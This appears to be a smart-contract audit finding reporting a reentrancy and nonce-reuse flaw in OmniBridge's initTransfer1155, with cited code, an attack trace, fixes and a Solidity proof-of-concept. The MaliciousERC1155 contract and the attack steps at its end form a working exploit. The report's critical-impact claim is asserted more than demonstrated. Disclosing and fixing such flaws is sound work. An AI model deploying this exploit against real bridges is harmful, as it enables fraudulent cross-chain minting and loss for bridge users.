### Title
Re-entrancy in `initTransfer1155` via Malicious ERC1155 Allows Unauthorized Token Minting on NEAR — (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.initTransfer1155` increments `currentOriginNonce` at the top of the function but reads the same storage variable again when emitting the `InitTransfer` event, after an external call to `IERC1155.safeTransferFrom`. A malicious ERC1155 token can re-enter `initTransfer1155` during that callback, causing the outer call to emit an `InitTransfer` event with a nonce that was already consumed by the inner call. Because the bridge's `onERC1155Received` guard only checks `operator == address(this)` — a condition that is always satisfied when the bridge itself calls `safeTransferFrom` — the malicious token can also skip the actual token transfer entirely. The net result is that the NEAR side observes a valid-looking `InitTransfer` event and mints bridged tokens to the attacker without any EVM-side collateral ever being locked.

---

### Finding Description

`initTransfer1155` follows this sequence:

```
currentOriginNonce += 1;                          // line 448 — storage write, e.g. N+1
IERC1155(tokenAddress).safeTransferFrom(...);     // line 458 — external call, re-entry point
emit BridgeTypes.InitTransfer(
    ..., currentOriginNonce, ...                  // line 483 — reads storage again
);
``` [1](#0-0) [2](#0-1) [3](#0-2) 

The `emit` reads `currentOriginNonce` from storage rather than from a local variable captured before the external call. If a re-entrant call increments the nonce again, the outer call's event carries the wrong (already-used) nonce.

The bridge's only guard against unsolicited ERC1155 callbacks is:

```solidity
function onERC1155Received(address operator, ...) external view override returns (bytes4) {
    if (operator != address(this)) revert ERC1155DirectSendNotAllowed();
    return this.onERC1155Received.selector;
}
``` [4](#0-3) 

`operator` is the address that called `safeTransferFrom` on the ERC1155 contract. Because `initTransfer1155` is the caller, `operator == address(this)` is always true — the guard is trivially bypassed by any ERC1155 token whose `safeTransferFrom` implementation invokes the callback before (or instead of) actually moving tokens.

There is no `ReentrancyGuard` or `nonReentrant` modifier anywhere in `OmniBridge`.

`logMetadata1155` is fully permissionless, so the attacker can register their malicious token with the bridge before the attack: [5](#0-4) 

---

### Impact Explanation

**Critical — unauthorized minting / escrow mis-accounting.**

Attack trace (single re-entry level, `currentOriginNonce` starts at N):

| Step | Actor | Effect |
|---|---|---|
| 1 | Attacker calls `initTransfer1155` (outer) | `currentOriginNonce` → N+1 |
| 2 | Bridge calls `safeTransferFrom` on malicious ERC1155 | Malicious token calls `onERC1155Received(bridge, ...)` → passes; then re-enters `initTransfer1155` (inner) |
| 3 | Inner call executes | `currentOriginNonce` → N+2; inner `safeTransferFrom` called; malicious token does NOT transfer tokens; inner call emits `InitTransfer` with nonce **N+2** |
| 4 | Outer `safeTransferFrom` returns (no tokens transferred) | Outer call emits `InitTransfer` with nonce **N+2** (wrong — should be N+1) |

Outcome on NEAR: two `InitTransfer` events share nonce N+2. NEAR finalizes one (minting tokens to the attacker). The second is rejected as a replay. Nonce N+1 is never emitted and never finalized. The bridge holds **zero** locked EVM tokens for either transfer, yet the attacker receives bridged tokens on NEAR.

---

### Likelihood Explanation

The attacker needs only:
1. Deploy a malicious ERC1155 contract (trivial).
2. Call the permissionless `logMetadata1155` to register it (no admin access required).
3. Call `initTransfer1155` with the malicious token.

No privileged role, no front-running dependency, no external oracle. The `onERC1155Received` guard is structurally bypassed by design whenever the bridge itself is the `safeTransferFrom` caller. Likelihood is **high**.

---

### Recommendation

1. **Cache the nonce in a local variable** before any external call and use that local variable in the `emit`:
   ```solidity
   uint64 nonce = ++currentOriginNonce;
   // ... external calls ...
   emit BridgeTypes.InitTransfer(msg.sender, deterministicToken, nonce, ...);
   ```
2. **Add `nonReentrant`** from OpenZeppelin's `ReentrancyGuardUpgradeable` to both `initTransfer` and `initTransfer1155`.
3. Apply the same fix to `initTransfer` (lines 381 / 430), which has an identical nonce-in-storage-emit pattern exploitable via ERC777 `tokensToSend` hooks. [6](#0-5) [7](#0-6) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    bool private reentered;

    constructor(address _bridge) { bridge = IOmniBridge(_bridge); }

    // ERC1155 safeTransferFrom — does NOT move tokens; triggers re-entry instead
    function safeTransferFrom(
        address, address to, uint256 id, uint256 amount, bytes calldata
    ) external {
        // Call onERC1155Received on the bridge with operator = address(bridge)
        // so the guard (operator != address(this)) passes
        IERC1155Receiver(to).onERC1155Received(
            msg.sender, // msg.sender here IS the bridge → operator == address(bridge)
            address(this), id, amount, ""
        );

        if (!reentered) {
            reentered = true;
            // Re-enter: increments nonce to N+2, emits InitTransfer(nonce=N+2)
            bridge.initTransfer1155(address(this), id, amount, 0, 0, "near:attacker.near", "");
            reentered = false;
        }
        // No actual token transfer — bridge holds nothing
    }

    // Minimal ERC1155 stubs
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

// Attack:
// 1. Deploy MaliciousERC1155(bridge)
// 2. bridge.logMetadata1155(malicious, tokenId)  ← permissionless registration
// 3. bridge.initTransfer1155(malicious, tokenId, amount, 0, 0, "near:attacker.near", "")
//    → outer emits InitTransfer(nonce=N+2), inner emits InitTransfer(nonce=N+2)
//    → NEAR finalizes one → mints tokens to attacker; bridge holds 0 EVM tokens
```

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L234-270)
```text
    function logMetadata1155(
        address tokenAddress,
        uint256 tokenId
    ) external payable {
        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        MultiTokenInfo storage multiToken = multiTokens[deterministicToken];

        if (multiToken.tokenAddress == address(0)) {
            multiToken.tokenAddress = tokenAddress;
            multiToken.tokenId = tokenId;
        } else {
            if (
                multiToken.tokenAddress != tokenAddress ||
                multiToken.tokenId != tokenId
            ) {
                revert ERC1155MappingMismatch();
            }
        }

        logMetadataExtension(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );

        emit BridgeTypes.LogMetadata(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L381-381)
```text
        currentOriginNonce += 1;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L427-436)
```text
        emit BridgeTypes.InitTransfer(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L448-448)
```text
        currentOriginNonce += 1;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L458-464)
```text
        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L480-489)
```text
        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```
